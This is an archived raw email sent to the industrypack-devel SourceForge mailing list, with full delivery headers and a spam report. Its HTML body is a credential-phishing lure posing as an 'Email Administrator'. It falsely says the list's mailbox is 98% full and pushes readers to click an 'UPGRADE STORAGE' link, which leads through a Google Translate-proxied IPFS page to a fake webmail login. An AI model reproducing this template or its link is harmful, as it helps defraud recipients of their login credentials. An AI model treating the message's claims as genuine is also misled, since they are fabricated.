Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E8737623A12
	for <lists+industrypack-devel@lfdr.de>; Thu, 10 Nov 2022 03:52:19 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1osxfu-00077K-Ml
	for lists+industrypack-devel@lfdr.de;
	Thu, 10 Nov 2022 02:52:18 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@seambee.buzz>) id 1osxft-00077D-ST
 for industrypack-devel@lists.sourceforge.net;
 Thu, 10 Nov 2022 02:52:17 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=kz6BOMuneZ8lELDPGTcYIX5qPZKtVYhIvNgUzPgsfs8=; b=Jj23RT7K7hwRUuwR0i0T7vDLug
 R5R8qbfFcxcZWF3cTNg3tqJX1FoUgQOodxDXB2jFA5LiKDU59mc6Z7wmXIyq8KurbJu8wxfHOJusp
 3r28N5B4ThNALWENTgPdRJL2Y/q+zUC5/ENM3qyp9G5+UrrTyK9i9Be0xGfjKhHH0Qus=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=kz6BOMuneZ8lELDPGTcYIX5qPZKtVYhIvNgUzPgsfs8=; b=k
 kQzJ/ELg0KweDbhb5NROmOIGII5m8L4pkax+0D8VGYhA7dEPavObWF3cedE/oMW8T5HJEMjJRIzWR
 j7iWEsKEEE4rG+lOxCt8D6QQZNDGkNaUM+RtWrA89zUO7rf7VOp3h85af3M4XLX6hfh/473rci/2T
 B/qybcSDaIFMNDdE=;
Received: from [103.149.28.153] (helo=mail.seambee.buzz)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1osxfp-002cMr-VZ for industrypack-devel@lists.sourceforge.net;
 Thu, 10 Nov 2022 02:52:17 +0000
Received: from seambee.buzz (unknown [46.183.222.100])
 by mail.seambee.buzz (Postfix) with ESMTPA id 731DEB789
 for <industrypack-devel@lists.sourceforge.net>;
 Wed,  9 Nov 2022 21:34:46 -0500 (EST)
From: Email Admin<admin@seambee.buzz>
To: industrypack-devel@lists.sourceforge.net
Date: 10 Nov 2022 04:34:44 +0200
Message-ID: <20221110043444.1182C9FC32480D81@seambee.buzz>
MIME-Version: 1.0
X-Spam-Score: 5.4 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: industrypack-devel@lists.sourceforge.net mailbox is 98% full.
 2.36 GB 1.98 GB Your mailbox industrypack-devel@lists.sourceforge.net will
 not send or receive messages with attachments due to low space from today
 11/10/2022 4:34:44 a.m.. You are required to upgrade your storage i [...]
 Content analysis details:   (5.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML 0.0 FROM_SUSPICIOUS_NTLD   From abused NTLD
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.0 FROM_SUSPICIOUS_NTLD_FP From abused NTLD
 2.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-Headers-End: 1osxfp-002cMr-VZ
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net /
 Urgent action required..!!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7878729691641572518=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============7878729691641572518==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
<BODY>
<P style=3D'BOX-SIZING: border-box; MARGIN-BOTTOM: 1.5em; FONT-SIZE: small;=
 FONT-FAMILY: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; WHITE=
-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 600; =
COLOR: rgb(0,0,102); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WI=
DOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'><FONT size=
=3D4>industrypack-devel@lists.sourceforge.net mailbox is&nbsp;</FONT><SPAN =
style=3D"FONT-SIZE: large; COLOR: rgb(218,60,47)">98%&nbsp;</SPAN><SPAN sty=
le=3D"FONT-SIZE: large">full.</SPAN></P>
<TABLE style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Grande", Verdana, Ar=
ial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-=
COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,5=
1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; f=
ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial'=20
cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 0.5em">
<TD style=3D"BOX-SIZING: border-box; WIDTH: 320px; BACKGROUND: rgb(218,60,4=
7); MARGIN: 0px"><FONT size=3D4>&nbsp;</FONT></TD>
<TD style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(224,224,224); MARGIN: =
0px"><FONT size=3D4>&nbsp;</FONT></TD></TR></TBODY></TABLE>
<TABLE style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Grande", Verdana, Ar=
ial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-=
COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,5=
1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; f=
ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial'=20
cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px" align=3Dleft><SPAN style=
=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold; COLOR: rgb(218,60,47)"><FONT=
 size=3D4>2.36 GB</FONT></SPAN></TD>
<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px" align=3Dright><SPAN style=
=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold"><FONT size=3D4>1.98 GB</FONT=
></SPAN></TD></TR></TBODY></TABLE>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><FONT size=3D4><SPAN style=3D"COLO=
R: rgb(51,51,51)">Your mailbox<SPAN>&nbsp;</SPAN></SPAN><FONT color=3D#134f=
5c><B>industrypack-devel@lists.sourceforge.net</B></FONT><FONT color=3D#333=
333><SPAN>&nbsp;will</SPAN> not send or receive messages with attachments d=
ue to low space from today<SPAN>&nbsp;</SPAN></FONT><FONT color=3D#134f5c><=
B>11/10/2022 4:34:44 a.m.</B></FONT><FONT color=3D#333333>.</FONT><BR style=
=3D"BOX-SIZING: border-box"><FONT color=3D#333333>
You are required to upgrade your storage immediately now.&nbsp;</FONT></FON=
T></P>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><U style=3D"BOX-SIZING: border-box=
"><FONT style=3D"BOX-SIZING: border-box" color=3D#0000ff size=3D4><SPAN sty=
le=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">
<A style=3D"BOX-SIZING: border-box; COLOR: rgb(1,134,186); BACKGROUND-COLOR=
: transparent; text-decoration-line: none" href=3D"https://lkd5pugwfiufbzsa=
w6qwzqeirkhiqd4nyi-ipfs-dweb-link.translate.goog/?_x_tr_hp=3Dbafybeidxfsjmf=
r5ulfkn3nha&amp;_x_tr_sl=3Dauto&amp;_x_tr_tl=3Den&amp;_x_tr_hl=3Den-US#indu=
strypack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://marshallasso=
ciates.co.za/cvx/roundcube/index.php?email%3Dinfo@advancedbathroomsolutions=
=2Ecom.au&amp;source=3Dgmail&amp;ust=3D1668117933800000&amp;usg=3DAOvVaw1xO=
ag6U_kUh-qUV1QjLpdp">UPGRADE industrypack-devel@lists.sourceforge.net STORA=
GE</A></SPAN></FONT></U></P>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><FONT size=3D4><SPAN style=3D"BOX-=
SIZING: border-box; FONT-WEIGHT: bolder; COLOR: rgb(51,51,51)">Mailbox addr=
ess:<BR style=3D"BOX-SIZING: border-box"></SPAN><FONT color=3D#134f5c><B>in=
dustrypack-devel@lists.sourceforge.net</B></FONT><BR style=3D"BOX-SIZING: b=
order-box"><FONT color=3D#333333>2022<SPAN>&nbsp;</SPAN></FONT><FONT color=
=3D#134f5c><B>lists.sourceforge.net</B></FONT><FONT color=3D#333333><SPAN>&=
nbsp;</SPAN>Email Administrator Inc. All Rights Reserved</FONT></FONT></P><=
/BODY></HTML>


--===============7878729691641572518==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7878729691641572518==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7878729691641572518==--
